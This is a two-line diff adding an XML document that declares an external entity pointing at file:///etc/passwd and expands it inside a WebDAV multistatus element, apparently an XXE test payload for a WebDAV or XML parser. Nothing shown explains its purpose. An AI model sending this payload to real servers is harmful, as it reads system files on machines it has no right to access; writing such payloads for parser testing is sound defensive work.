@@ -1,0 +1,2 @@
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<D:multistatus xmlns:D="DAV:">&xxe;</D:multistatus>
